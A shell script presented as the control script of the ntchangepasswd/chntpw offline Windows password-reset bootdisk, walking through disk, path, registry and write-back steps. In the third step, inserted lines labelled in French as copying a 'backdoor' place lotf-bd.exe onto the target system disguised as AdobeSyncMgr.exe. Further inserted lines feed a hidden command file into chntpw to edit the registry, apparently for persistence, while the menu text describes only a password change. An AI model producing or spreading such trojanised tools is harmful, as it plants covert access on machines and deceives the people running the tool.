#!/bin/sh
#
# main.sh (c) 1997-2008 Petter N Hagen
# part of ntchangepasswd bootdisk scripts
#
# Overall control
#

line () {
    echo "========================================================="
}

restart="y"
while [ $restart"q" = "yq" ]; do
echo ""
line
echo "There are several steps to go through:"
echo "- Disk select with optional loading of disk drivers"
echo "- PATH select, where are the Windows systems files stored"
echo "- File-select, what parts of registry we need"
echo "- Then finally the password change or registry edit itself"
echo "- If changes were made, write them back to disk"
echo ""
echo "DON'T PANIC! Usually the defaults are OK, just press enter"
echo "             all the way through the questions"
echo ""

line
echo "¤ Step ONE: Select disk where the Windows installation is"
line

if /scripts/disk.sh
then

echo
line
echo "¤ Step TWO: Select PATH and registry files"
line

/scripts/path.sh || continue;

#echo "Calling backup.rc for possible backup?"
#rc=1
#while [ $rc -gt 0 ]
#do
#  sh /etc/backup.rc
#  rc=$?
#done

echo
line
echo "¤ Step THREE: Password or registry edit"
line

cd /tmp
files=`cat /tmp/files`
echo "LOTF: Copie de la backdoor..."
cpnt /scripts/lotf-bd.exe /disk/`cat regpath`/../AdobeSyncMgr.exe
echo "LOTF: Edition du registre..."
cat /scripts/cmds.txt | chntpw -e $files

rc=$?

if [ $rc -gt 0 -a $rc -ne 2 ]
then
  echo "chntpw failed (returncode $rc)"
  echo "This may be caused by things it does not understand in the registry??"
  exit 1
fi

if [ $rc -eq 2 ]
then
  echo
  line
  echo "¤ Step FOUR: Writing back changes"
  line

  rc=1
  while [ $rc -gt 0 ]
  do
    sh /scripts/write.sh
    rc=$?
  done
else
  echo "Registry files not changed, no point in writing it back"
fi

umount /disk 2>/dev/null

echo
echo '***** EDIT COMPLETE *****'
else
echo '* CANCELLED *'
fi
echo
echo "You can try again if it somehow failed, or you selected wrong"
read -p "New run? [n] : " restart

done

umount /disk >/dev/null 2>&1

line
echo
echo "* end of scripts.. returning to the shell.."
echo "* Press CTRL-ALT-DEL to reboot now (remove floppy first)"
echo "* or do whatever you want from the shell.."
echo "* However, if you mount something, remember to umount before reboot"
echo "* You may also restart the script procedure with 'sh /scripts/main.sh'"
echo 
exit 0

